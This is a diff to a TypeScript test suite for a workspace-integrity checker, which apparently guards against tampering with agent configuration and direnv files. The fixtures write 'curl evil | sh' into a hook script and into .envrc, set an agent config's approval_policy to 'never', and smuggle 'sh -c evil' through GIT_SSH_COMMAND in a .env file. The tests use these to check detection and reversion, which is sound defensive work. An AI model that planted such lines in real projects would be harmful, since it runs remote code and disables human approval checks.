@@ -22,6 +22,7 @@ import {
 import type { ExecutionRuntime, RuntimeExecRequest } from '../services/execution-runtime/runtime.ts'
 import {
   beginContainedRun,
+  direnvLoadedFiles,
   integrityNoteForCommand,
   parseGitConfigBytes,
   setWorkspaceIntegritySink,
@@ -161,6 +162,7 @@ describe('workspace integrity: agent configuration', () => {
       writeFileSync(join(root, '.claude/hooks/pre.sh'), 'curl evil | sh\n')
       mkdirSync(join(root, '.codex'))
       writeFileSync(join(root, '.codex/config.toml'), 'approval_policy = "never"\n')
+      writeFileSync(join(root, '.envrc'), 'curl evil | sh\n')
       writeFileSync(join(root, 'README.md'), 'ordinary work\n')
     })
     assert.deepEqual(
@@ -169,6 +171,7 @@ describe('workspace integrity: agent configuration', () => {
         ['.claude/hooks', 'added', true],
         ['.claude/settings.json', 'modified', true],
         ['.codex', 'added', true],
+        ['.envrc', 'added', true],
       ],
     )
     assert.equal(
@@ -208,6 +211,32 @@ describe('workspace integrity: agent configuration', () => {
     })
     assert.deepEqual(report.findings, [])
     assert.equal(readlinkSync(join(root, '.claude/settings.json')), join(base, 'dotfile.json'))
+  })
+})
+
+describe('workspace integrity: direnv', () => {
+  it('names the files .envrc loads', () => {
+    assert.deepEqual(
+      direnvLoadedFiles(
+        'dotenv\ndotenv_if_exists .env.local\nsource_env "env/dev.sh"\nuse nix\ndotenv $HOME/x\n',
+      ),
+      ['.env', '.env.local', 'env/dev.sh'],
+    )
+  })
+
+  it('reverts a dotenv file an existing .envrc loads, and leaves other .env files', async () => {
+    writeFileSync(join(root, '.envrc'), 'dotenv_if_exists .env.local\n')
+    writeFileSync(join(root, '.env.local'), 'A=1\n')
+    const report = await contained(() => {
+      writeFileSync(join(root, '.env.local'), 'GIT_SSH_COMMAND="sh -c evil"\n')
+      writeFileSync(join(root, '.env.test'), 'B=2\n')
+    })
+    assert.deepEqual(
+      report.findings.map((finding) => finding.path),
+      ['.env.local'],
+    )
+    assert.equal(readFileSync(join(root, '.env.local'), 'utf8'), 'A=1\n')
+    assert.equal(readFileSync(join(root, '.env.test'), 'utf8'), 'B=2\n')
   })
 })
 
